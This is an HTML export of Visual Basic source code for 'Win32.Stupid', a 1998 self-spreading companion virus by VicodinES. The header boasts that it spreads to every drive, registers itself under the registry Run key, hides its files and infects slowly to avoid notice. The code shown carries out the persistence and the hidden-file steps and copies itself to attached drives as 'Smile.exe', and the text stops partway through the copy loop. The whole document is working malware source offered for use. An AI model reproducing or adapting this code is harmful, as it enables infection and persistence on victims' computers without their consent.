<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'------------------------------'------------------------------
' Win32.Stupid
'    by VicodinES
'        First virus ever written in VB5
'            First VB virus ever (I think)
'
'------------------------------'------------------------------
'
' Companion Virus - EXE infection
'
' What does it do?
'
'   Copies itself to all available resources on initial execution
'       (removable drives and floppy included)
'   Registers itself as a "RUN" service in the registry
'       (activated during each reboot)
'   Has a small message box payload.
'   Makes infected floppys "bootable infectors"
'   Makes infected zip drives "carriers" (with an autorun.inf)
'   Slow infector
'       (only does one EXE per reboot othewise it might be too obvious)
'   Works on Win95/98/NT
'
' Drawbacks:
'
'   It's a companion virus
'   DLL dependent in 95/NT (Win98 ships with the dll)
'   it's too big
'
'------------------------------'------------------------------
'
'   I tried to comment the best I could - I am a SLOPPY PROGRAMMER so if you don't
'   understand something or start to go nuts because I don't indent then just ask
'   me for an explanatioin - Vic
'
'------------------------------'------------------------------
'
' (c) The Narkotic Network, July 1998
'
'------------------------------'------------------------------
'
' **THIS IS THE 2nd VERSION - A FEW BUG FIXES A FEW CHANGES**
'------------------------------'------------------------------
</span><span class="sc0">
</span><span class="sc1">' Declare API's
</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegOpenKeyExA</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpSubKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">ulOptions</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">samDesired</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">phkResult</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegQueryValueExA</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpValueName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpReserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpcbData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegCloseKey</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetLogicalDriveStrings</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetLogicalDriveStringsA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nBufferLength</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetDriveType</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetDriveTypeA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nDrive</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetShortPathName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetShortPathNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpszLongPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpszShortPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cchBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegSetValueExA</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpValueName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Reserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpValue</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cbData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc1">' Declare Variables and such...
</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">xc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">Smilecopy</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Dat0copy</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">smile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dat0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">weare</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wearecom</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">supspn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sup</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">companion</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nodat0</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Load</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc1">' Handle Errors
</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc1">' Need for REG - API calls
</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">REG_DWORD</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">REG_SZ</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">HKEY_CURRENT_USER</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80000001</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">HKEY_LOCAL_MACHINE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80000002</span><span class="sc0">

</span><span class="sc1">' Check To See If The Payload Goes Off Now
</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PassCheck</span><span class="sc0">

</span><span class="sc1">' Some Local Variables
</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc7">v$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">String$</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">      </span><span class="sc1">' Fill v$ with 256 chars of "0"
</span><span class="sc7">weare</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0">     </span><span class="sc1">' The name of the EXE that was just executed
</span><span class="sc7">wearecom</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">weare</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".com"</span><span class="sc0">   </span><span class="sc1">' The name of the EXE if it was .com (companion name)
</span><span class="sc7">smile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">weare</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">      </span><span class="sc1">' The full name of the EXE (+.exe)
</span><span class="sc7">dat0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"dat0.exe"</span><span class="sc0">           </span><span class="sc1">' The name of our main file (dat0.exe)
</span><span class="sc7">dat0home</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">dat0</span><span class="sc0">     </span><span class="sc1">' Our main file with path (c:\)
</span><span class="sc7">HoldMeDear</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">wearecom</span><span class="sc6">)</span><span class="sc0">  </span><span class="sc1">' A dir check to see if there is already a companion file
</span><span class="sc0">
</span><span class="sc1">' Check the REG for the Win95 Startup Dir
' we will use this info later in our code
</span><span class="sc0">
</span><span class="sc7">u</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegOpenKeyExA</span><span class="sc6">(</span><span class="sc7">HKEY_CURRENT_USER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">KEY_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">u</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegQueryValueExA</span><span class="sc6">(</span><span class="sc7">k</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Startup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">REG_SZ</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">v$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">u</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegCloseKey</span><span class="sc6">(</span><span class="sc7">k</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">v$</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid$</span><span class="sc6">(</span><span class="sc7">v$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Chr$</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">done</span><span class="sc0">
    </span><span class="sc7">sup</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sup</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc3">Mid$</span><span class="sc6">(</span><span class="sc7">v$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0">
</span><span class="sc7">done</span><span class="sc6">:</span><span class="sc0">

</span><span class="sc1">' take the Directory found and get the short path name from it
</span><span class="sc0">
</span><span class="sc7">supspn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">spn</span><span class="sc6">(</span><span class="sc7">sup</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc1">' if there was a *.com file then set companion to true
</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">HoldMeDear</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">wearecom</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">companion</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">

</span><span class="sc1">' Check the REG for our RUN value
</span><span class="sc0">
</span><span class="sc7">u</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegOpenKeyExA</span><span class="sc6">(</span><span class="sc7">HKEY_CURRENT_USER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">KEY_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">u</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegQueryValueExA</span><span class="sc6">(</span><span class="sc7">k</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Vic"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">REG_SZ</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">v$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">u</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegCloseKey</span><span class="sc6">(</span><span class="sc7">k</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid$</span><span class="sc6">(</span><span class="sc7">v$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"d"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">makereg</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
    </span><span class="sc7">wein</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc1">' Make dat0.exe visable
</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc7">dat0home</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbArchive</span><span class="sc0">

</span><span class="sc1">' See if dat0.exe exists
</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">dat0home</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">dat0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">nodat0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">

</span><span class="sc1">' Set dat0.exe hidden again
</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc7">dat0home</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbReadOnly</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbSystem</span><span class="sc0">

</span><span class="sc1">' If there was a dat0.exe and we are dat0.exe (just executed) then run virus code
</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">nodat0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">weare</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"DAT0"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">WeVirus</span><span class="sc0">

</span><span class="sc1">' If there was a dat0.exe and a companion was found then execute the file
' (pass control to the file and quit)
</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">nodat0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc7">companion</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">ExecuteFile</span><span class="sc0">

</span><span class="sc1">' If we didn't jump out of code yet them we are acting as a "worm"
' First thing to do is find all the drives attaced to this computer
</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Find_Drives</span><span class="sc0">

</span><span class="sc1">' Copy ourself to all attaced drives
' We copy ourself as Smile.exe just in case someone finds us
' on a network drive and wonders what smile.exe does :)
</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">xc</span><span class="sc0">
</span><span class="sc7">Smilecopy</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Smile.exe"</span><span class="sc0">
</span><span class="sc7">Dat0copy</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">dat0</span><span class="sc0">
</span><span class="sc7">typeofdrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetDriveType</span><span class="sc6">(</span><span class="sc3">CStr</span><span class="sc6">(</span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">typeofdrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">typeofdrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">typeofdrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">typeofdrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">typeofdrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">typeofdrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"A:\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">ARD</span><span class="sc0">  </span><span class="sc1">' Check to see if we are about to
</span><span class="sc0">                                        </span><span class="sc1">' copy to a removable drive but not
</span><span class="sc0">                                        </span><span class="sc1">' drive a:  -- if so we want to make
</span><span class="sc0">                                        </span><span class="sc1">' a autorun.inf
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"A:\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">    </span><span class="sc1">' if the drive is a: then
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">ADrive</span><span class="sc0">             </span><span class="sc1">' jump to a: specific code
</span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">adone</span><span class="sc6">:</span><span class="sc0">             </span><span class="sc1">' - jump out of this part of the loop
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">Smilecopy</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Smile.exe"</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">nodat0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">          </span><span class="sc1">' if we didn't find dat0.exe on c:
